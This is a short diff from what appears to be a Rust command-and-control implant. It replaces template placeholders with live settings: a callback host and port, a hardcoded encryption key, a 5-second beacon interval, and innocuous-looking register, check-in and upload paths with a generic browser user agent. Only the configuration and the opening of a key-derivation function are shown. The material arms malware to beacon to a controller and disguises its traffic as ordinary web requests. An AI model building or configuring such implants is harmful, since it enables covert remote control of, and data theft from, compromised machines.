@@ -21,16 +21,16 @@ type HmacSha256 = Hmac<Sha256>;
 static mut C2S_KEY: [u8; 32] = [0u8; 32];
 static mut S2C_KEY: [u8; 32] = [0u8; 32];
 
-const EP: &str = "{{C2_HOST}}";
-const PT: &str = "{{C2_PORT}}";
-const SC: &str = "{{C2_SCHEME}}";
-const AK: &str = "{{ENCRYPTION_KEY}}";
-const SI: u64 = {{BEACON_INTERVAL}};
-const SJ: u64 = {{BEACON_JITTER}};
-const P1: &str = "{{REGISTER_URI}}";
-const P2: &str = "{{CHECKIN_URI}}";
-const P3: &str = "{{RESULT_URI}}";
-const UA: &str = "{{USER_AGENT}}";
+const EP: &str = "192.168.1.200";
+const PT: &str = "8088";
+const SC: &str = "http";
+const AK: &str = "SOCKPUPPETS_KEY_2026";
+const SI: u64 = 5;
+const SJ: u64 = 0;
+const P1: &str = "/submit-form";
+const P2: &str = "/api/v1/update";
+const P3: &str = "/upload";
+const UA: &str = "Mozilla/5.0";
 
 fn hkdf_derive(ikm: &[u8], salt: &[u8], info: &[u8]) -> [u8; 32] {
     let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).unwrap();
